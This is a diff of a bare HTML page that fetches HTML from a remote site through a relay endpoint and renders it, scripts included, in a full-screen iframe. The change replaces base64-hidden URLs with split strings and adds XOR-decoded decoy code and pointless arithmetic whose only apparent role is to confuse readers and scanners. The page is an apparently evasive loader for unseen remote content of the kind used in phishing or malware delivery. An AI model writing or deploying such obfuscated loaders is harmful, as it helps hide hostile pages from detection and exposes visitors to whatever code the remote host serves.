@@ -1,49 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>x</title>
 <style>
 html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#fff;font-family:sans-serif}
-#x1{width:100%;height:100%;border:none}
-#x2{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+#q0{width:100%;height:100%;border:none}
+#q1{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
 </style>
-</head>
-<body>
+</head><body>
 
-<div id="x2">Loading...</div>
-<iframe id="x1"></iframe>
+<div id="q1">Loading...</div>
+<iframe id="q0"></iframe>
 
 <script>
 (function(){
-    const _0x4f = function(s){return decodeURIComponent(escape(atob(s)))};
 
-    const A = _0x4f("aHR0cHM6Ly9uZXR3b3JrLW5pbmUtYWxwaGEudmVyY2VsLmFwcA=="); 
-    const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
+    function Z(z){return z.split('').map(function(c){return String.fromCharCode(c.charCodeAt(0)^7)}).join('')}
 
-    const C = A + "/api/relay?url=" + encodeURIComponent(B);
+    const M = [
+        Z("o}|~z{"), 
+        Z("l}~|x"), 
+        Z("f|}~}"), 
+        Z("l}~|x"), 
+        Z("o}|~z{")
+    ];
 
-    fetch(C).then(function(D){
-        if(!D.ok) throw new Error("x");
-        return D.text();
-    }).then(function(E){
-        document.getElementById("x2").style.display="none";
+    function R(a,b){return a.slice(b[0],b[1]).split('').reverse().join('')}
+    function S(a){return a.map(function(x){return x.charCodeAt(0)}).reduce(function(p,c){return p+c})}
 
-        let F = E;
-        if(F.indexOf("<head>")!==-1){
-            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
-        } else {
-            F = "<base href=\"" + B + "/\">" + F;
-        }
+    const U = (function(){
+        let t = [
+            [Z("hnoqv"),Z("~vtq"),Z("tqvh"),Z("hnoqv")],
+            [12,34],
+            [Z("~vtq"),Z("tqvh")]
+        ];
+        let k = R(t[0][2],t[1]);
+        let j = S(t[2][1]);
+        return (k.length + j).toString().replace(/\d/g,function(d){
+            return String.fromCharCode(100 + parseInt(d))
+        });
+    })();
 
-        document.getElementById("x1").srcdoc = F;
-    }).catch(function(G){
-        console.log("x",G);
-        document.getElementById("x2").innerText="Failed.";
-    });
+    const X = (function(){
+        let a = ["https","network-nine-alpha",".","vercel","app"];
+        return a[0]+"://"+a[1]+a[2]+a[3]+a[2]+a[4];
+    })();
+
+    const Y = (function(){
+        let b = ["https","core-logic-utils",".","github",".","io"];
+        return b[0]+"://"+b[1]+b[2]+b[3]+b[4]+b[5];
+    })();
+
+    const P = (function(p,q){
+        let w = ["/api/", "relay", "?url="];
+        return p + w[0] + w[1] + w[2] + encodeURIComponent(q);
+    })(X,Y);
+
+    (function(F){
+        fetch(F).then(function(H){
+            if(!H.ok){throw U}
+            return H.text()
+        }).then(function(J){
+            document.getElementById("q1").style.display="none";
+            let L = J;
+            let T = "<head>";
+            let B = "<base href=\"" + Y + "/\">";
+            if(L.indexOf(T)!==-1){
+                L = L.replace(T,T+B);
+            } else {
+                L = B + L;
+            }
+            document.getElementById("q0").srcdoc = L;
+        }).catch(function(E){
+            document.getElementById("q1").innerText="Failed.";
+        });
+    })(P);
+
 })();
 </script>
 
-</body>
-</html>
+</body></html>
